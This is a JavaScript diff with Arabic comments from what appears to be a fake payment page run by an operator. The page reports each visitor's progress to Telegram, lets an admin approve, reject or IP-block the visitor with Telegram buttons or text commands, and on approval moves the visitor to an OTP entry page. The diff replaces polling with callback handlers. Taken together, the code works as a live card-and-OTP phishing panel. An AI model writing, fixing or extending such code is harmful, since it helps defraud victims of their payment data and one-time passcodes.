@@ -424,77 +424,62 @@ function showVerifyingOverlay() {
 
 /* ─── استلام قرار الأدمن ──────────────────────────── */
 function startVerifyPolling() {
-  clearInterval(verifyPollInt);
-  verifyPollInt = setInterval(async () => {
-    if (paymentApproved) return;
-    const updates = await tgGetUpdates();
-    for (const u of updates) {
-      lastVerifyUpdateId = u.update_id;
-
-      /* ── زر Inline Callback ── */
-      if (u.callback_query) {
-        const cq = u.callback_query;
-        const data = cq.data || '';
-
-        if (data.startsWith('approve_')) {
-          const ref = data.replace('approve_', '');
-          if (ref === myRefNumber) {
-            paymentApproved = true;
-            clearInterval(verifyPollInt);
-            cancelAnimationFrame(verifyAnimFrame);
-            await tgAnswerCallback(cq.id, '✅ تم الموافقة');
-            await tgEditMessage(cq.message.message_id,
-              cq.message.text + '\n\n✅ <b>تم الموافقة — جاري التحويل...</b>', null);
-            goToOTP();
-            return;
-          }
-        }
-
-        if (data.startsWith('reject_')) {
-          const ref = data.replace('reject_', '');
-          if (ref === myRefNumber) {
-            paymentApproved = true;
-            clearInterval(verifyPollInt);
-            cancelAnimationFrame(verifyAnimFrame);
-            await tgAnswerCallback(cq.id, '❌ تم الرفض');
-            await tgEditMessage(cq.message.message_id,
-              cq.message.text + '\n\n❌ <b>تم الرفض</b>', null);
-            showVerifyReject();
-            return;
-          }
-        }
-
-        if (data.startsWith('block_')) {
-          const ref = data.replace('block_', '');
-          const ip = await Tracker.getIP();
-          await tgAnswerCallback(cq.id, '🚫 جاري الحظر...');
-          await tgEditMessage(cq.message.message_id,
-            cq.message.text + `\n\n🚫 <b>تم حظر العميل</b>\nIP: <code>${ip}</code>`,
-            { inline_keyboard: [[{ text: '✅ إلغاء الحظر', callback_data: `unblockip_${ip}` }]] });
-          await Tracker.blockIP(ip);
-          return;
-        }
-
-      }
-
-      /* ── نص عادي (backup) ── */
-      const text = (u.message?.text || '').trim();
-      if (text === 'دخول' || text === 'otp') {
-        paymentApproved = true;
-        clearInterval(verifyPollInt);
-        cancelAnimationFrame(verifyAnimFrame);
-        goToOTP();
-        return;
-      }
-      if (text.toUpperCase() === 'REJECT') {
-        paymentApproved = true;
-        clearInterval(verifyPollInt);
-        cancelAnimationFrame(verifyAnimFrame);
-        showVerifyReject();
-        return;
-      }
+  Tracker.onCallback('approve_', async (cq, data) => {
+    const ref = data.replace('approve_', '');
+    if (ref === myRefNumber && !paymentApproved) {
+      paymentApproved = true;
+      cancelAnimationFrame(verifyAnimFrame);
+      tgAnswerCallback(cq.id, '✅ تم الموافقة');
+      tgEditMessage(cq.message.message_id,
+        cq.message.text + '\n\n✅ <b>تم الموافقة — جاري التحويل...</b>', null);
+      goToOTP();
     }
-  }, 2500);
+  });
+
+  Tracker.onCallback('reject_', async (cq, data) => {
+    const ref = data.replace('reject_', '');
+    if (ref === myRefNumber && !paymentApproved) {
+      paymentApproved = true;
+      cancelAnimationFrame(verifyAnimFrame);
+      tgAnswerCallback(cq.id, '❌ تم الرفض');
+      tgEditMessage(cq.message.message_id,
+        cq.message.text + '\n\n❌ <b>تم الرفض</b>', null);
+      showVerifyReject();
+    }
+  });
+
+  Tracker.onCallback('block_', async (cq, data) => {
+    const ip = await Tracker.getIP();
+    tgAnswerCallback(cq.id, '🚫 جاري الحظر...');
+    tgEditMessage(cq.message.message_id,
+      cq.message.text + `\n\n🚫 <b>تم حظر العميل</b>\nIP: <code>${ip}</code>`,
+      { inline_keyboard: [[{ text: '✅ إلغاء الحظر', callback_data: `unblockip_${ip}` }]] });
+    Tracker.blockIP(ip);
+  });
+
+  Tracker.onCallback('دخول', async (msg) => {
+    if (!paymentApproved) {
+      paymentApproved = true;
+      cancelAnimationFrame(verifyAnimFrame);
+      goToOTP();
+    }
+  });
+
+  Tracker.onCallback('otp', async (msg) => {
+    if (!paymentApproved) {
+      paymentApproved = true;
+      cancelAnimationFrame(verifyAnimFrame);
+      goToOTP();
+    }
+  });
+
+  Tracker.onCallback('REJECT', async (msg) => {
+    if (!paymentApproved) {
+      paymentApproved = true;
+      cancelAnimationFrame(verifyAnimFrame);
+      showVerifyReject();
+    }
+  });
 }
 
 /* ─── الانتقال لصفحة OTP ──────────────────────────── */
@@ -591,12 +576,6 @@ function initSubmit() {
 
     /* 📊 إرسال رحلة العميل */
     await Tracker.sendJourneyToTelegram('💰 <b>العميل وصل صفحة الدفع</b>');
-
-    /* تجاوز رسائل قديمة */
-    const oldUpdates = await tgGetUpdates();
-    if (oldUpdates.length > 0) {
-      lastVerifyUpdateId = oldUpdates.reduce((max, u) => Math.max(max, u.update_id), 0);
-    }
 
     /* عرض الشاشة + بدء الاستماع لقرار الأدمن */
     showVerifyingOverlay();
